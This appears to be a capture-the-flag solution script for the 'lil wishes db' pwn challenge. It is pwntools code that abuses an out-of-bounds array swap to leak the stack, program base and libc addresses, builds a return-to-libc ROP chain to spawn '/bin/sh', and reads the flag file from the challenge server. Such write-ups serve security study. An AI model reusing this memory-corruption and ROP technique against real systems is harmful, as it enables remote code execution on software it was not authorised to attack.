# lil wishes db (pwn 359, 56 solves)

from pwn import *
elf = ELF("./chall")
libc = ELF("./libc.so.6")

# r = process(['./chall'])
r = remote("challs.xmas.htsp.ro", 2002)

# OOB access in swap because of invalid check (reading signed then using unsigned)
# We can swap in and out our data past the end of the array
# Array is on stack, so we swap out return if we want to ROP
# and we can leak whatever's around including the canary (not like it matters)

def real_off(i):
    return -(2**16-i)

def set_offset(offset, value):
    r.sendlineafter("Option: \n", "3")
    r.sendlineafter("Index: \n", "0")
    r.sendlineafter("Value: \n", str(value))
    r.sendlineafter("Option: \n", "1")
    r.sendlineafter("Index 1:\n", "0")
    r.sendlineafter("Index 2:\n", str(real_off(offset)))

def get_offset(offset):
    r.sendlineafter("Option: \n", "1")
    r.sendlineafter("Index 1:\n", "0")
    r.sendlineafter("Index 2:\n", str(real_off(offset)))
    r.sendlineafter("Option: \n", "2")
    m = r.recvuntil("ID[1]").decode().split("\n")[-2].split(" ")[-1]
    r.sendlineafter("Option: \n", "1")
    r.sendlineafter("Index 1:\n", "0")
    r.sendlineafter("Index 2:\n", str(real_off(offset)))
    return int(m)

# We'll use the standard ROP to libc, but we need to leak ASLR of the program first
# Then leak libc from return address, and then /bin/sh away

# 1~7 -> none, equiv to real
# At 8(+0x60) is a stack pointer
# At 9(+0x68) is our stack canary...?
# And at 10+ is the return addresses (starting with saved ebp)
# +11 is __libc_start_main+231 as claimed by gdb

log.info("Leaking addresses")
base = get_offset(10)
POP_RDI = 0x0000000000000bb3 + base - 0xb50
log.info("base @ %s" % hex(base))

leak = get_offset(11)
libc.address = leak - libc.symbols['__libc_start_main'] - 0x231
log.info("libc @ %s" % hex(libc.address))
bsh = next(libc.search(b"/bin/sh")) - 64

p = log.progress("Setting up ROP")
p.status("1/4")
set_offset(11, POP_RDI)
p.status("2/4")
set_offset(12, bsh)
p.status("3/4")
set_offset(13, libc.sym["system"])
p.status("4/4")
set_offset(14, libc.sym["exit"])
p.success("Done")

log.info("Go!")
r.sendlineafter("Option: \n", "4")
r.sendlineafter("Christmas!\n", "cat /home/ctf/flag.txt")
m = r.recvuntil("}").decode().split("\n")[-1]
log.success("Flag: " + m)

# X-MAS{oh_nooo_y0u_ru1ned_the_xmas}
